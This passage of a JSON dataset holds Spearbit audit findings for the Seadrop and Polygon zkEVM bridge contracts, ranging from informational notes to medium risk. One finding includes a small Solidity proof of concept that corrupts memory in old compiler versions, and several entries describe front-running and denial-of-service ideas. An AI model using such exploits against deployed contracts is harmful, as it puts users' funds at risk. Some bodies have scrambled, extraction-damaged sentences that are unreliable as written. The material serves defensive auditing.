uninitialized AllowList", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The default value for _allowListMerkleRoots[nftContract] is 0. A transaction that tries to mint an NFT in this case with an empty proof (or any other proof) should revert. There were no tests for this case.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Consider naming state variables as public to replace the user-defined getters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Several state variables, for example, mapping(address => PublicDrop) private _publicDrops; but have corresponding getters defined (function getPublicDrop(address have private visibility, nftContract)). Replacing private by public and renaming the variable name can decrease the code. There are several examples of the above pattern in the codebase, however we are only listing one here for brevity.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Use bytes.concat instead of abi.encodePacked for concatenation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "While one of the uses of abi.encodePacked is to perform concatenation, the Solidity language does contain a reserved function for this: bytes.concat.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Misleading comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The comment says // Check that the sender is the owner of the allowedNftTokenId.. However, minter isn't necessarily the sender due to how it's set: address minter = minterIfNotPayer != address(0) ? minterIfNotPayer : msg.sender;.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Use i instead of j as an index name for a non-nested for-loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "Using an index named j instead of i is confusing, as this naming convention makes developers expect that the for-loop is nested, but this is not the case. Using i is more standard and less surprising.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Avoid duplicating code for consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "The _checkActive function is used in every mint function besides mintPublic where the code is almost the same.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "restrictFeeRecipients is always true for either PublicDrop or TokenGatedDrop in ERC721SeaDrop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "restrictFeeRecipients is always true for either PublicDrops or TokenGatedDrops. When either one of these drops gets created/updated by calling one of the four functions below on a ERC721SeaDrop contract, its value is hardcoded as true:  updatePublicDrop  updatePublicDropFee  updateTokenGatedDrop  updateTokenGatedDropFee", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Reformat lines for better readability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "These lines are too long to be readable. A mistake isn't easy to spot.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Comment is a copy-paste", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": "This comment is exactly the same as this one. This is a copy-paste mistake.", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Usage of floating pragma is not recommended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seadrop-Spearbit-Security-Review.pdf", "body": " 0.8.11 is declared in files.  In foundry.toml: solc_version = '0.8.15' is used for the default build profile.  In hardhat.config.ts and hardhat-coverage.config.ts: \"0.8.14\" is used. 31", "labels": ["Spearbit", "Seadrop", "Severity: Informational"]}, {"title": "Funds can be sent to a non existing destination", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function bridgeAsset() and bridgeMessage() do check that the destination network is different If accidentally the wrong than the current network. However, they dont check if the destination network exists. networkId is given as a parameter, then the function is sent to a nonexisting network. If the network would be deployed in the future the funds would be recovered. However, in the meantime they are inaccessible and thus lost for the sender and recipient. Note: other bridges usually have validity checks on the destination. function bridgeAsset(...) ... { require(destinationNetwork != networkID, ... ); ... } function bridgeMessage(...) ... { require(destinationNetwork != networkID, ... ); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Medium Risk"]}, {"title": "Fee on transfer tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The bridge contract will not work properly with a fee on transfer tokens 1. User A bridges a fee on transfer Token A from Mainnet to Rollover R1 for amount X. 2. In that case X-fees will be received by bridge contract on Mainnet but the deposit receipt of the full amount X will be stored in Merkle. 3. The amount is claimed in R1 and a new TokenPair for Token A is generated and the full amount X is minted to User A 4. Now the full amount is bridged back again to Mainnet 5. When a claim is made on Mainnet then the contract tries to transfer amount X but since it received the amount X-fees it will use the amount from other users, which eventually causes DOS for other users using the same token", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Medium Risk"]}, {"title": "Function consolidatePendingState() can be executed during emergency state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function consolidatePendingState() can be executed by everyone even when the contract is in an emergency state. This might interfere with cleaning up the emergency. Most other functions are disallowed during an emergency state. function consolidatePendingState(uint64 pendingStateNum) public { if (msg.sender != trustedAggregator) { require(isPendingStateConsolidable(pendingStateNum),...); } _consolidatePendingState(pendingStateNum); }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Medium Risk"]}, {"title": "Sequencers can re-order forced and non-forced batches", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Sequencers have a certain degree of control over how non-forced and forced batches are ordered. Consider the case where we have two sets of batches; non-forced (NF) and forced (F). A sequencer can order the following sets of batches (F1, F2) and (NF1, NF2) in any order so as long as the order of the forced batch and non-forced batch sets are kept in order. i.e. A sequencer can sequence batches as F1 -> NF1 -> NF2 -> F2 but they can also equivalently sequence these same batches as NF1 -> F1 -> F2 -> NF2.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Check length of smtProof", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "An obscure Solidity bug could be triggered via a call in solidity 0.4.x. Current solidity versions revert with panic 0x41. The problem could occur if unbounded memory arrays were used. This situation happens to be the case as verifyMerkleProof() (and all the functions that call it) dont check the length of the array (or loop over the entire array). It also depends on memory variables (for example structs) being used in the functions, that doesnt seem to be the case. Here is a POC of the issue which can be run in remix // SPDX-License-Identifier: MIT // based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol , pragma solidity ^0.4.24; // only works with low solidity version import \"hardhat/console.sol\"; contract test{ struct Overlap { uint field0; } function mint(uint[] memory amounts) public { Overlap memory v; console.log(\"before: \",amounts[0]); v.field0 = 567; console.log(\"after: \",amounts[0]); // would expect to be 0 however is 567 } function go() public { // this part requires the low solidity version bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, 2**251); bool success = address(this).call(payload); console.log(success); } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Transaction delay due to free claimAsset() transactions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The sequencer rst processes the free claimAsset() transaction and then the rest. This might delay other transactions if there are many free claimAsset() transactions. As these transactions would have to be initiated on the mainnet, the gas costs there will reduce this problem. However, once multiple rollups are supported in the future the transactions could originate from another rollup with low gas costs. func (s *Sequencer) tryToProcessTx(ctx context.Context, ticker *time.Ticker) { ... appendedClaimsTxsAmount := s.appendPendingTxs(ctx, true, 0, getTxsLimit, ticker) // `claimAsset()` transactions , appendedTxsAmount := s.appendPendingTxs(ctx, false, minGasPrice.Uint64(), getTxsLimit-appendedClaimsTxsAmount, ticker) + appendedClaimsTxsAmount , ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Misleading token addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function claimAsset() deploys TokenWrapped contracts via create2 and a salt. This salt is based on the originTokenAddress. By crafting specic originTokenAddresses, its possible to create vanity addresses on the other chain. These addresses could be similar to legitimate tokens and might mislead users. Note: it is also possible to directly deploy tokens on the other chain with vanity addresses (e.g. without using the bridge) function claimAsset(...) ... { ... bytes32 tokenInfoHash = keccak256(abi.encodePacked(originNetwork, originTokenAddress)); ... TokenWrapped newWrappedToken = (new TokenWrapped){ salt: tokenInfoHash }(name, symbol, decimals); ... } 8", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Limit amount of gas for free claimAsset() transactions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Function claimAsset() is subsidized (e.g. gasprice is 0) on L2 and allows calling a custom contract. This could be misused to execute elaborate transactions for free. Note: safeTransfer could also call a custom contract that has been crafted before and bridged to L1. Note: this is implemented in the Go code, which detects transactions to the bridge with function bridgeClaimMethodSignature == \"0x7b6323c1\", which is the selector of claimAsset(). See function IsClaimTx() in transaction.go. function claimAsset(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}(new bytes(0)); ... IERC20Upgradeable(originTokenAddress).safeTransfer(destinationAddress,amount); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "What to do with funds that cant be delivered", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Both claimAsset() and claimMessage() might revert on different locations (even after retrying). Although the funds stay in the bridge, they are not accessible by the originator or recipient of the bridge action. So they are essentially lost for the originator and recipient. Some other bridges have recovery addresses where the funds can be delivered instead. Here are several potential revert situations: 9 function claimAsset(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}(new bytes(0)); require(success, ... ); ... IERC20Upgradeable(originTokenAddress).safeTransfer(destinationAddress,amount); ... TokenWrapped newWrappedToken = (new TokenWrapped){ salt: tokenInfoHash }(name, symbol, decimals); ... } function claimMessage(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Inheritance structure does not openly support contract upgrades", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The solidity compiler uses C3 linearisation to determine the order of contract inheritance. This is performed as left to right of all child contracts before considering the parent contract. Storage slot assignment PolygonZkEVMBridge is as follows: Initializable -> DepositContract -> EmergencyManager -> The Initializable.sol already reserves storage slots for future upgrades and because PolygonZkEVM- Bridge.sol is inherited last, storage slots can be safely appended. However, the two intermediate contracts, DepositContract.sol and EmergencyManager.sol, cannot handle storage upgrades.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Function calculateRewardPerBatch() could divide by 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function calculateRewardPerBatch() does a division by totalBatchesToVerify. If there are currently no batches to verify, then totalBatchesToVerify would be 0 and the transaction would revert. When calculateRewardPerBatch() is called from _verifyBatches() this doesnt happen as it will revert earlier. However when the function is called externally this situation could occur. function calculateRewardPerBatch() public view returns (uint256) { ... uint256 totalBatchesToVerify = ((lastForceBatch - lastForceBatchSequenced) + lastBatchSequenced) - getLastVerifiedBatch(); return currentBalance / totalBatchesToVerify; , }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Limit gas usage of _updateBatchFee()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function _updateBatchFee() loops through all unveried batches. Normally this would be 30 min/5 min ~ 6 batches. Assume the aggregator malfunctions and after one week, verifyBatches() is called, which calls _updateBatch- Fee(). Then there could be 7 * 24 * 60 min/ 5 min ~ 2352 batches. The function verifyBatches() limits this to MAX_VERIFY_BATCHES == 1000. This might result in an out-of-gas error. This would possibly require multiple verifyBatches() tries with a smaller number of batches, which would increase network outage. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... while (currentBatch != currentLastVerifiedBatch) { ... if (block.timestamp - currentSequencedBatchData.sequencedTimestamp >veryBatchTimeTarget) { ... } ... } ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Keep precision in _updateBatchFee()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Function _updateBatchFee() uses a trick to prevent losing precision in the calculation of accDivi- sor. The value accDivisor includes an extra multiplication with batchFee, which is undone when doing batchFee = (batchFee * batchFee) / accDivisor because this also contains an extra multiplication by batchFee. However, if batchFee happens to reach a small value (also see issue Minimum and maximum value for batch- Fee) then the trick doesnt work that well. In the extreme case of batchFee ==0 then a division by 0 will take place, resulting in a revert. Luckily this doesnt happen in practice. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... uint256 accDivisor = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * 3)); batchFee = (batchFee * batchFee) / accDivisor; ... , }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Minimum and maximum value for batchFee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Function _updateBatchFee() updates the batchFee depending on the batch time target. If the batch times are repeatedly below or above the target, the batchFee could shrink or grow unlimited. If the batchFee would get too low, problems with the economic incentives might arise. If the batchFee would get too high, overows might occur. Also, the fee might too be high to be practically payable. Although not very likely to occur in practice, it is probably worth the trouble to implement limits. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... if (totalBatchesBelowTarget < totalBatchesAboveTarget) { ... batchFee = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * , 3)); } else { ... uint256 accDivisor = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * 3)); , batchFee = (batchFee * batchFee) / accDivisor; } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Bridge deployment will fail if initialize() is front-run", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "grades.deployProxy() with no type specied. This function accepts data which is used to initialize the state of the contract being deployed. However, because the zkEVM bridge script utilizes the output of each contract address on deployment, it is not trivial to atomically deploy and initialize contracts. As a result, there is a small time window available for attackers to front-run calls to initialize the necessary bridge contracts, allowing them to temporarily DoS during the deployment process.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Add input validation for the setVeryBatchTimeTarget method", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The setVeryBatchTimeTarget method in PolygonZkEVM accepts a uint64 newVeryBatchTimeTar- get argument to set the veryBatchTimeTarget. This variable has a value of 30 minutes in the initialize method, so it is expected that it shouldnt hold a very big value as it is compared to timestamps difference in _updateBatchFee. Since there is no upper bound for the value of the newVeryBatchTimeTarget argument, it is possible (for example due to fat-ngering the call) that an admin passes a big value (up to type(uint64).max) which will result in wrong calculation in _updateBatchFee.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Single-step process for critical ownership transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "If the nominated newAdmin or newOwner account is not a valid account, the owner or admin risks locking themselves out. function setAdmin(address newAdmin) public onlyAdmin { admin = newAdmin; emit SetAdmin(newAdmin); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Ensure no native asset value is sent in payable method that can handle ERC20 transfers as well", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The bridgeAsset method of PolygonZkEVMBridge is marked payable as it can work both with the native asset as well as with ERC20 tokens. In the codepath where it is checked that the token is not the native asset but an ERC20 token, it is not validated that the user did not actually provide value to the transaction. The likelihood of this happening is pretty low since it requires a user error but if it does happen then the native asset value will be stuck in the PolygonZkEVMBridge contract.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Calls to the name, symbol and decimals functions will be unsafe for non-standard ERC20 tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The bridgeAsset method of PolygonZkEVMBridge accepts an address token argument and later calls the name, symbol and decimals methods of it. There are two potential problems with this: 1. Those methods are not mandatory in the ERC20 standard, so there can be ERC20-compliant tokens that do not have either or all of the name, symbol or decimals methods, so they will not be usable with the protocol, because the calls will revert 2. There are tokens that use bytes32 instead of string as the value type of their name and symbol storage vari- ables and their getter functions (example is MKR). This can cause reverts when trying to consume metadata from those tokens. Also, see weird-erc20 for nonstandard tokens.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Low Risk"]}, {"title": "Use calldata instead of memory for array parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The code frequently uses memory arrays for externally called functions. Some gas could be saved by making these calldata. The calldata can also be cascaded to internal functions that are called from the external functions. function claimAsset(bytes32[] memory smtProof) public { ... _verifyLeaf(smtProof); ... } function _verifyLeaf(bytes32[] memory smtProof) internal { ... verifyMerkleProof(smtProof); ... } function verifyMerkleProof(..., bytes32[] memory smtProof, ...) internal { ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize networkID == MAINNET_NETWORK_ID", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The value for networkID is dened in initialize() and MAINNET_NETWORK_ID is constant. So networkID == MAINNET_NETWORK_ID can be calculated in initialize() and stored to save some gas. It is even cheaper if networkID is immutable, which would require adding a constructor. uint32 public constant MAINNET_NETWORK_ID = 0; uint32 public networkID; function initialize(uint32 _networkID, ...) public virtual initializer { networkID = _networkID; ... } function _verifyLeaf(...) ... { ... if (networkID == MAINNET_NETWORK_ID) { ... } else { ... } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize updateExitRoot()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function updateExitRoot() accesses the global variables lastMainnetExitRoot and las- tRollupExitRoot multiple times. This can be optimized using temporary variables. function updateExitRoot(bytes32 newRoot) external { ... if (msg.sender == rollupAddress) { lastRollupExitRoot = newRoot; } if (msg.sender == bridgeAddress) { lastMainnetExitRoot = newRoot; } bytes32 newGlobalExitRoot = keccak256( abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) ); if ( ... ) { ... emit UpdateGlobalExitRoot(lastMainnetExitRoot, lastRollupExitRoot); } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize _setClaimed()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function claimAsset() and claimMessage() rst verify !isClaimed() (via the function _veri- fyLeaf()) and then do _setClaimed(). These two functions can be combined in a more efcient version. 17 function claimAsset(...) ... { _verifyLeaf(...); _setClaimed(index); ... } function claimMessage(...) ... { _verifyLeaf(...); _setClaimed(index); ... } function _verifyLeaf(...) ... { require( !isClaimed(index), ...); ... } function isClaimed(uint256 index) public view returns (bool) { uint256 claimedWordIndex = index / 256; uint256 claimedBitIndex = index % 256; uint256 claimedWord = claimedBitMap[claimedWordIndex]; uint256 mask = (1 << claimedBitIndex); return (claimedWord & mask) == mask; } function _setClaimed(uint256 index) private { uint256 claimedWordIndex = index / 256; uint256 claimedBitIndex = index % 256; claimedBitMap[claimedWordIndex] = claimedBitMap[claimedWordIndex] | (1 << claimedBitIndex); }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "SMT branch comparisons can be optimised", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "When verifying a merkle proof, the search does not terminate until we have iterated through the tree depth to calculate the merkle root. The path is represented by the lower 32 bits of the index variable where each bit represents the direction of the path taken. Two changes can be made to the following snippet of code:  Bit shift currentIndex to the right instead of dividing by 2.  Avoid overwriting the currentIndex variable and perform the bitwise comparison in-line. function verifyMerkleProof( ... uint256 currrentIndex = index; for ( uint256 height = 0; height < _DEPOSIT_CONTRACT_TREE_DEPTH; height++ ) { } if ((currrentIndex & 1) == 1) node = keccak256(abi.encodePacked(smtProof[height], node)); else node = keccak256(abi.encodePacked(node, smtProof[height])); currrentIndex /= 2;", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Increments can be optimised by pre-xing variable with ++", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "There are small gas savings in performing when pre-xing increments with ++. Sometimes this can be used to combine multiple statements, like in function _deposit(). function _deposit(bytes32 leafHash) internal { ... depositCount += 1; uint256 size = depositCount; ... } Other occurrences of ++: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: lib/DepositContract.sol: lib/DepositContract.sol: { , lib/DepositContract.sol: { , lib/TokenWrapped.sol: verifiers/Verifier.sol: verifiers/Verifier.sol: verifiers/Verifier.sol: for (uint256 i = 0; i < batchesNum; i++) { currentLastForceBatchSequenced++; currentBatchSequenced++; lastPendingState++; lastForceBatch++; for (uint256 i = 0; i < batchesNum; i++) { currentLastForceBatchSequenced++; currentBatchSequenced++; height++ for (uint256 height = 0;height < _DEPOSIT_CONTRACT_TREE_DEPTH;height++) for (uint256 height = 0;height < _DEPOSIT_CONTRACT_TREE_DEPTH;height++) nonces[owner]++, for (uint i = 0; i < elements; i++) { for (uint i = 0; i < input.length; i++) { for (uint i = 0; i < input.length; i++) {", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Move initialization values from initialize() to immutable via constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The contracts PolygonZkEVM and PolygonZkEVMBridge initialize variables via initialize(). If these variables are never updated they could also be made immutable, which would save some gas. In order to achieve that, a constructor has to be added to set the immutable variables. This could be applicable for chainID in contract PolygonZkEVM and networkID in contract PolygonZkEVMBridge contract PolygonZkEVM is ... { ... uint64 public chainID; ... function initialize(...) ... { ... chainID = initializePackedParameters.chainID; ... } contract PolygonZkEVMBridge is ... { ... uint32 public networkID; ... function initialize(uint32 _networkID,...) ... { networkID = _networkID; ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize isForceBatchAllowed()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The modier isForceBatchAllowed() includes a redundant check == true. This can be optimized to save some gas. modifier isForceBatchAllowed() { require(forceBatchAllowed == true, ... ); _; }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize loop in _updateBatchFee()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function _updateBatchFee() uses the following check in a loop: - currentSequencedBatchData.sequencedTimestamp > veryBatchTimeTarget. block.timestamp - veryBatchTimeTarget > currentSequencedBatchData.sequencedTimestamp block.timestamp The is the same as: As block.timestamp - veryBatchTimeTarget is constant during the execution of this function, it can be taken outside the loop to save some gas. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... while (currentBatch != currentLastVerifiedBatch) { ... if ( block.timestamp - currentSequencedBatchData.sequencedTimestamp > veryBatchTimeTarget ) { ... } } }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize multiplication", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The multiplication in function _updateBatchFee can be optimized to save some gas.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Changing constant storage variables from public to private will save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Usually constant variables are not expected to be read on-chain and their value can easily be seen by looking at the source code. For this reason, there is no point in using public for a constant variable since it auto-generates a getter function which increases deployment cost and sometimes function call cost.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Storage variables not changeable after deployment can be immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "If a storage variable is not changeable after deployment (set in the constructor) it can be turned into an immutable variable to save gas.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize check in _consolidatePendingState()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The check in function _consolidatePendingState() can be optimized to save some gas. As last- PendingStateConsolidated is of type uint64 and thus is at least 0, the check pendingStateNum > lastPend- ingStateConsolidated makes sure pendingStateNum > 0. So the explicit check for pendingStateNum != 0 isnt necessary. uint64 public lastPendingStateConsolidated; function _consolidatePendingState(uint64 pendingStateNum) internal { require( pendingStateNum != 0 && pendingStateNum > lastPendingStateConsolidated && pendingStateNum <= lastPendingState, \"PolygonZkEVM::_consolidatePendingState: pendingStateNum invalid\" ); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Custom errors not used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "Custom errors lead to cheaper deployment and run-time costs.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Variable can be updated only once instead of on each iteration of a loop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "In functions sequenceBatches() and sequenceForceBatches(), the currentBatchSequenced vari- able is increased by 1 on each iteration of the loop but is not used inside of it. This means that instead of doing batchesNum addition operations, you can do it only once, after the loop.", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Optimize emits in sequenceBatches() and sequenceForceBatches()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The emits in functions sequenceBatches() and sequenceForceBatches() could be gas optimized by using the tmp variables which have been just been stored in the emited global variables. function sequenceBatches(...) ... { ... lastBatchSequenced = currentBatchSequenced; ... emit SequenceBatches(lastBatchSequenced); } function sequenceForceBatches(...) ... { ... lastBatchSequenced = currentBatchSequenced; ... emit SequenceForceBatches(lastBatchSequenced); }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Only update lastForceBatchSequenced if nessary in function sequenceBatches()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The function sequenceBatches() writes back to lastForceBatchSequenced, however this is only necessary if there are forced batches. This could be optimized to save some gas and at the same time the calculation of nonForcedBatchesSequenced could also be optimized. function sequenceBatches(...) ... { ... uint64 currentLastForceBatchSequenced = lastForceBatchSequenced; ... if (currentBatch.minForcedTimestamp > 0) { currentLastForceBatchSequenced++; ... uint256 nonForcedBatchesSequenced = batchesNum - (currentLastForceBatchSequenced - lastForceBatchSequenced); ... lastForceBatchSequenced = currentLastForceBatchSequenced; ... , }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Delete forcedBatches[currentLastForceBatchSequenced] after use", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "The functions sequenceBatches() and sequenceForceBatches() use up the forcedBatches[] and then afterward they are no longer used. Deleting these values might give a gas refund and lower the L1 gas costs. function sequenceBatches(...) ... { ... currentLastForceBatchSequenced++; ... require(hashedForcedBatchData == ... forcedBatches[currentLastForceBatchSequenced],...); } function sequenceForceBatches(...) ... { ... currentLastForceBatchSequenced++; ... require(hashedForcedBatchData == forcedBatches[currentLastForceBatchSequenced],...); ... }", "labels": ["Spearbit", "zkEVM-bridge", "Severity: Gas Optimization"]}, {"title": "Calculate keccak256(currentBatch.transactions) once", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf", "body": "cak256(currentBatch.transactions) twice. calculating the keccak256() of it could be relatively expensive. sequenceBatches() functions Both kec- sequenceForceBatches() As the currentBatch.transactions could be rather large, calculate and function sequenceBatches(BatchData[] memory batches) ... { ... if (currentBatch.minForcedTimestamp > 0) { ... bytes32 hashedForcedBatchData = ... keccak256(currentBatch.transactions) ... ... } ... currentAccInputHash = ... keccak256(currentBatch.transactions) ... ... } function 